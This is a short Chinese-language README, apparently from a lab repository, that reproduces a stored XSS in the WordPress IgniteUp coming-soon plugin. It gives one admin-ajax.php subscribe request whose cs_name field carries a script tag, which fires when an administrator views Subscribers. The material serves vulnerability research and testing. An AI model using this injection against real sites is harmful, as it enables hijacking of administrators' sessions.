## 说明

原文https://blog.nintechnet.com/multiple-vulnerabilities-in-wordpress-igniteup-coming-soon-and-maintenance-mode-plugin/
总共发现了4个cve，都说是未授权的，但是我看很多都是admin_init的，绕不过wordpress本身的认证，可能是方式不太对...

这个是存储型xss漏洞的利用，压缩包是插件

### payload:

/wp-admin/admin-ajax.php?action=subscribe_email&cs_email=1@11.coc.com&cs_name=<script>alert(1)</script>

![image](https://github.com/guobaoyou/vul_environment/blob/master/wordpress_igniteup_plugin_xss
/images/1.jpg)

当管理员查看Subscribers时，触发漏洞。
![image](https://github.com/guobaoyou/vul_environment/blob/master/wordpress_igniteup_plugin_xss
/images/2.jpg)
